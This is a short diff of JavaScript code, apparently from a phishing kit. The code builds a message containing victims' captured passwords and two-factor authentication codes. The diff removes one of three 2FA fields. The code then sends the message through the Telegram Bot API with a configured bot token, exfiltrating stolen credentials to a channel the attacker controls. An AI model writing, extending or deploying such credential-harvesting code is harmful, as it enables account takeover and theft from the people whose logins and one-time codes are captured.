@@ -78,8 +78,7 @@ const Utils = {
 <b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
 ----------------------------------
 <b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
-<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
+<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>`;
 
 		try {
 			await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
